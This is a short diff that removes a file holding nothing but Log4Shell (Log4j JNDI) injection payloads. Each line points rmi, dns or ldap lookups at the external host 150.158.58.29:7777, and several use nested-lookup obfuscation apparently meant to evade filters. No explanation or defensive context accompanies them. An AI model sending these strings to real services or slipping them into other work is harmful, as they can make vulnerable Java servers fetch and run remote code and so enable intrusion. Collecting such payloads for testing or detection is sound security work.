@@ -1,8 +1,0 @@
-${jndi:rmi://150.158.58.29:7777/randomstr}
-${jndi:dns://150.158.58.29:7777/randomstr}
-${jndi:ldap://150.158.58.29:7777/randomstr}
-${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://150.158.58.29:7777/randomstr}
-${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://150.158.58.29:7777/randomstr}
-${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//150.158.58.29:7777/randomstr}
-${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//150.158.58.29:7777/randomstr}
-${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//150.158.58.29:7777/randomstr}
